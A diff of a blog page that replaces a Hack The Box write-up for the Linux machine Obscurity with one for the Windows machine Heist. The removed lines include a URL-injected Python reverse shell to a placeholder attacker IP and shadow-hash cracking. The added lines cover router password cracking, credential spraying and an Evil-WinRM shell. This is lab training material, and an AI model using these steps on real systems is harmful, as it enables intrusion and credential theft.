@@ -3,33 +3,46 @@
 <head>
     <meta charset="utf-8">
 
-    <title>HTB Write-up | Obscurity</title>
+    <title>HTB Write-up | Heist</title>
 
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-    <link rel="canonical" href="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
+    <link rel="canonical" href="https://inesmartins.github.io//htb-walkthrough-heist/" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
     
     <meta property="og:site_name" content="Inês Martins" />
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="HTB Write-up | Obscurity" />
-    <meta property="og:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
-    <meta property="article:published_time" content="2020-06-07T17:54:05.000Z" />
-    <meta property="article:modified_time" content="2020-12-08T10:38:05.000Z" />
+    <meta property="og:title" content="HTB Write-up | Heist" />
+    <meta property="og:description" content="Retired machine can be found here. After doing an initial scan with nmap, we find 3 exposed services: a web server on port 80 which seems to be a &quot;Support Login Page&quot;;MSRPC on port 135;SMBv2 on port 445.After trying and failing to access the SMB service with" />
+    <meta property="og:url" content="https://inesmartins.github.io//htb-walkthrough-heist/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/heist.png" />
+    <meta property="article:published_time" content="2020-06-07T18:19:05.000Z" />
+    <meta property="article:modified_time" content="2020-12-08T09:48:24.000Z" />
+    <meta property="article:tag" content="windows" />
+    <meta property="article:tag" content="smb" />
+    <meta property="article:tag" content="smbv2" />
+    <meta property="article:tag" content="kali" />
+    <meta property="article:tag" content="cisco" />
+    <meta property="article:tag" content="rockyou" />
+    <meta property="article:tag" content="hashcat" />
+    <meta property="article:tag" content="impacket" />
+    <meta property="article:tag" content="crackmapexec" />
+    <meta property="article:tag" content="evil-winrm" />
+    
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="HTB Write-up | Obscurity" />
-    <meta name="twitter:description" content="Write-up for Obscurity, a retired HTB Linux machine." />
-    <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-obscurity/" />
-    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/1-1.png" />
+    <meta name="twitter:title" content="HTB Write-up | Heist" />
+    <meta name="twitter:description" content="Retired machine can be found here. After doing an initial scan with nmap, we find 3 exposed services: a web server on port 80 which seems to be a &quot;Support Login Page&quot;;MSRPC on port 135;SMBv2 on port 445.After trying and failing to access the SMB service with" />
+    <meta name="twitter:url" content="https://inesmartins.github.io//htb-walkthrough-heist/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/heist.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="windows, smb, smbv2, kali, cisco, rockyou, hashcat, impacket, crackmapexec, evil-winrm" />
     <meta name="twitter:site" content="@inesmartns" />
-    <meta property="og:image:width" content="594" />
-    <meta property="og:image:height" content="377" />
+    <meta property="og:image:width" content="598" />
+    <meta property="og:image:height" content="379" />
     
     <script type="application/ld+json">
 {
@@ -58,17 +71,18 @@
         "url": "https://inesmartins.github.io//author/ines/",
         "sameAs": []
     },
-    "headline": "HTB Write-up | Obscurity",
-    "url": "https://inesmartins.github.io//htb-walkthrough-obscurity/",
-    "datePublished": "2020-06-07T17:54:05.000Z",
-    "dateModified": "2020-12-08T10:38:05.000Z",
+    "headline": "HTB Write-up | Heist",
+    "url": "https://inesmartins.github.io//htb-walkthrough-heist/",
+    "datePublished": "2020-06-07T18:19:05.000Z",
+    "dateModified": "2020-12-08T09:48:24.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://inesmartins.github.io//content/images/2020/06/1-1.png",
-        "width": 594,
-        "height": 377
+        "url": "https://inesmartins.github.io//content/images/2020/06/heist.png",
+        "width": 598,
+        "height": 379
     },
-    "description": "Write-up for Obscurity, a retired HTB Linux machine.",
+    "keywords": "windows, smb, smbv2, kali, cisco, rockyou, hashcat, impacket, crackmapexec, evil-winrm",
+    "description": "Retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/201].\n\nAfter doing an initial scan with nmap, we find 3 exposed services:\n\n * a web server on port 80 which seems to be a &quot;Support Login Page&quot;;\n * MSRPC on port 135;\n * SMBv2 on port 445.\n\nAfter trying and failing to access the SMB service with null credentials, I\nmoved on to the web server.\n\nsmbclient -L heist.htb\nEnter WORKGROUP\\root&#x27;s password:\nsession setup failed: NT_STATUS_ACCESS_DENIED\n\n\nWappalyzer gives us",
     "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://inesmartins.github.io//"
@@ -100,118 +114,95 @@
         <article class="post">
 
             <header class="post-header">
-                <h1 class="post-title">HTB Write-up | Obscurity</h1>
+                <h1 class="post-title">HTB Write-up | Heist</h1>
                 <section class="post-meta">
                     <p class="author">by <a href="/author/ines/">Inês Martins</a></p>
                     <time class="post-date" datetime="2020-06-07">2020-06-07</time>
                 </section>
             </header>
             <figure class="post-image">
-                <amp-img src="https://inesmartins.github.io//content/images/2020/06/1-1.png" width="600" height="400" layout="responsive"></amp-img>
+                <amp-img src="https://inesmartins.github.io//content/images/2020/06/heist.png" width="600" height="400" layout="responsive"></amp-img>
             </figure>
             <section class="post-content">
 
-                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/219">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>After doing an initial scan with <code>nmap</code>, we find that this is a Linux (Ubuntu) machine with 2 exposed services: <code>OpenSSH</code> on port 22 and a custom web server on port 8080.</p><pre><code>$ nmap -sC -sV -A obscurity.htb
-
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-8080/tcp open http-proxy BadHTTPServer
-```</code></pre>
-<p>There is some content on the website which has some useful information:</p><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><figure class="kg-card kg-image-card kg-width-wide"></figure><p>So, now we know there is a file called <code>SuperSecureServer.py</code> which is in "the secret development directory". I used <a href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> to find it but you could probably just get it logically:</p><pre><code>$ wfuzz -w SecLists/Discovery/Web-Content/api/actions.txt --hc 404 http://obscurity.htb:8080/FUZZ/SuperSecureServer.py
+                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/201">here</a>.</em></p><p>After doing an initial scan with <code>nmap</code>, we find 3 exposed services:</p><ul><li>a web server on port 80 which seems to be a "Support Login Page";</li><li>MSRPC on port 135;</li><li>SMBv2 on port 445.</li></ul><figure class="kg-card kg-image-card"></figure><p>After trying and failing to access the <code>SMB</code> service with null credentials, I moved on to the web server.</p><pre><code>smbclient -L heist.htb
+Enter WORKGROUP\root's password:
+session setup failed: NT_STATUS_ACCESS_DENIED
 </code></pre>
-<p>The mystery directory is <code>develop</code>, so know we have access to <a href="http://obscurity.htb:8080/develop/SuperSecureServer.py">the server's source code</a>, in the form of a Python script: <br />While analysing it, we find something interesting:</p><figure class="kg-card kg-image-card"></figure><p>Here's our foothold: we can exploit this <a href="https://www.w3schools.com/python/ref_func_exec.asp">exec</a> and get us a shell as <code>wwwdata</code>.</p><pre><code>$ wget http://obscurity.htb:8080/';%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[ATTACKER_IP]',[ATTACKER_PORT]));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);a%20=%20'
+<p>Wappalyzer gives us a nice overview of this server.</p><figure class="kg-card kg-image-card"></figure><p>The initial page is the <a href="http://heist.htb/login.php">login</a> page, however by clicking the "Login as guest" button we're redirected to a much more interesting <a href="http://heist.htb/issues.php">issues</a> page.</p><figure class="kg-card kg-image-card"></figure><p>On this page, there is what looks like a conversation between a user named Hazard and a member of the support team for a Cisco router.</p><p><code>Hazard</code> was kind enough to provide us with a configuration file for their router, which is hosted at <a href="http://heist.htb/attachments/config.txt">http://heist.htb/attachments/config.txt</a>.<br />Unfortunately, we can't access other attachments which would have been interesting, so let's go through the config file.</p><pre><code>version 12.2
+no service pad
+service password-encryption
+!
+isdn switch-type basic-5ess
+!
+hostname ios-1
+!
+security passwords min-length 12
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 
+!
+username rout3r password 7 0242114B0E143F015F5D1E161713
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+!
+!
+ip ssh authentication-retries 5
+ip ssh version 2
+!
+!
+router bgp 100
+ synchronization
+ bgp log-neighbor-changes
+ bgp dampening
+ network 192.168.0.0Â mask 300.255.255.0
+ timers bgp 3 9
+ redistribute connected
+!
+ip classless
+ip route 0.0.0.0 0.0.0.0 192.168.0.1
+!
+!
+access-list 101 permit ip any any
+dialer-list 1 protocol ip list 101
+!
+no ip http server
+no ip http secure-server
+!
+line vty 0 4
+ session-timeout 600
+ authorization exec SSH
+ transport input ssh
 </code></pre>
-<hr></hr><h2 id="getting-user">Getting user</h2><p>It seems like our first goal is to become <code>robert</code>.</p><pre><code>$ cat etc/passwd
+<p>This config file contains:</p><ul><li>2 user passwords encrypted with a <a href="https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/107614-64.html">Cisco Type 7 algorithm</a> which can be <a href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">easily cracked</a>;</li><li>the <em>enable secret</em> password, which is an MD5 hash.</li></ul><p>To "crack" the <code>MD5</code> hash we use <a href="https://hashcat.net/hashcat/">hashcat</a> combined with the RockYou list, which we'll filter by words &gt;= 12 chars, since the config file lets us know that this router's passwords are at least 12 chars long.</p><pre><code>$ hashcat -a 0 -m 500 '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' rockyou_12andabove.txt
+</code></pre>
+<p>where:</p><ul><li><code>-a 0</code> = "straight" attack-mode</li><li><code>-m 500</code> = Cisco-IOS $1$ (MD5) hash type</li></ul><p>Now that we know Hazard's router's password, we're going to use <a href="https://github.com/byt3bl33d3r/CrackMapExec">crackmapexec</a> to try and login as Hazard on the machine</p><pre><code>$  crackmapexec heist.htb -u Hazard -p xxx
 ...
-robert:x:1000:1000:robert:/home/robert:/bin/bash
+CME heist.htb:445 SUPPORTDESK [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)
+CME heist.htb:445 SUPPORTDESK [+] SUPPORTDESK\Hazard:xxx
 </code></pre>
-<p>Listing the contents of <code>robert</code>'s home directory, we get some interesting files:</p><pre><code>$ ls /home/robert
-BetterSSH/BetterSSH.py
-check.txt
-out.txt
-passwordreminder.txt
-SuperSecureCrypt.py
-user.txt
+<p>So, we know now that the machine is a Windows 10, that it's a part of the SUPPORTDESK domain, and that the credentials we found are valid.<br />To enumerate the domain's users, we're going to use <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a>.</p><pre><code>$ python impacket/build/scripts-2.7/lookupsid.py SUPPORTDESK/Hazard:xxx@heist.htb
+
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Brute forcing SIDs at heist.htb
+[*] StringBinding ncacn_np:heist.htb[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)
 </code></pre>
-<pre><code>$ cat check.txt
-Encrypting this file with your key should result in out.txt, make sure your key is correct!
-
-$ cat out.txt
-¦ÚÈêÚÞØÛÝÝ‰×ÐÊß…ÞÊÚÉ’æßÝËˆÚÛÚêÙÉëéÑÒÝÍÐ…êÆáÙÞã–ÒÑˆÐáÙ¦ÕæØžãÊÎÍßÚêÆŽÝáäè‰ÎÍÚŒÎëÑÓäáÛÌ×‰v
-
-$ cat passwordreminder.txt
-´ÑÈÌÉàÙÁÑé¯·¿
+<p>So, let's create a file with all the users we know about and a file with the 3 passwords we cracked and let's see what works:</p><pre><code>$ crackmapexec heist.htb -d SUPPORTDESK -u users.txt -p passwords.txt
 </code></pre>
-<p>So, by encrypting <code>check.txt</code> with an unknown algorithm we get <code>out.txt</code>.<br />Also, when use we this key to encrypt <code>robert</code>'s password we get the content of <br /><code>passwordreminder.txt</code>.</p><p>This is a classic <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a>.<br />Let's create a script to find the key!</p><pre><code>import sys
-
-# extend alphabet if necessary
-alphabet = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ"
-
-def decode_ciphertext(ciphertext, key):
-    key_pos = 0
-    plaintext = ""
-    for x in ciphertext:
-        new_char = chr((ord(x) - ord(key[key_pos])) % 255)
-        plaintext += new_char
-        key_pos += 1
-        key_pos = key_pos % len(key)
-    return plaintext
-
-def get_key(p1, c1):
-    i = 0
-    key = ""
-    while i &lt; len(p1):
-        found_match = False
-        for x in alphabet:
-            new_char = chr((ord(p1[i]) + ord(x)) % 255)
-            if new_char == c1[i]:
-                print("Found match, current key is " + key)
-                found_match = True
-                i += 1
-                key += x
-        if found_match == False:
-            print("Couldn't find match for char at index " + str(i))
-            return 0
-    return key
-
-def main(argv):
-    p1 = open(argv[0], "r").read()
-    c1 = open(argv[1], "r").read()
-    c2 = open(argv[2], "r").read()
-
-    print("\nKnown plaintext: \n" + p1)
-    print("Known ciphertext: \n" + c1)
-    print("Ciphertext to decode: \n" + c2)
-
-    key = get_key(p1, c1)
-    if key == 0:
-        print("Unable to calculate key!")
-    else:
-        p2 = decode_ciphertext(c2, key)
-        print("Original plaintext: " + p2)
-
-if __name__ == "__main__":
-    if len(sys.argv) &lt; 3:
-        print("Please specify the following arguments:")
-        print("[0] known plaintext file")
-        print("[1] known ciphertext file")
-        print("[2] ciphertext to decode")
-    else:
-        main(sys.argv[1:])</code></pre><p>Now that we have <code>robert</code>'s password we can <code>SSH</code> into the machine, get the user flag and move on to root. </p><h2 id="getting-root">Getting root</h2><p>We start by doing some enumeration with <a href="https://github.com/rebootuser/LinEnum">LinEnum</a>:</p><pre><code>$ ./LinEnum.sh...
-User robert may run the following commands on obscure:
-(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
--e
+<p>P.S. According to crackmapexec's manual the -u option should allow a file to be passed as an argument, but this didn't work so I had to test each user individually.</p><p>We find that one of the credentials are valid for Chase, so let's try to establish a remote connection for that user with <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>:</p><pre><code>$ ruby evil-winrm/evil-winrm.rb -i heist.htb -u Chase -p 'xxx'
+Evil-WinRM shell v1.9
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Chase\Documents&gt;
 </code></pre>
-<p>Let's run <code>BetterSSH</code> as sudo to test this:</p><pre><code>$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-Enter username: robert
-Enter password: xxx
-Authed!
-</code></pre>
-<p>After looking at <code>BetterSSH.py</code> we realise there's a vulnerability we can exploit: we can read the passwords that are stored on /etc/shadow for a period of time on <code>/tmp/SSH/</code>.</p><figure class="kg-card kg-image-card"></figure><p>So we create a script to print them to a file we can read after the process is finished (<code>/tmp/o.txt</code>):</p><figure class="kg-card kg-image-card"></figure><p>Finally, we use <a href="https://www.openwall.com/john/">JohnTheRipper</a> to crack the hash:</p><pre><code>$ echo "root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7" &gt; shadow
-$ echo "root:x:0:0:root:/root:/bin/bash" &gt; passwd
-$ unshadow passwd shadow &gt; crack.password.db
-$ john crack.password.db
-</code></pre>
-<p>That's it, hope you enjoyed it!</p>
+<p>And that's it!</p>
 
             </section>
 
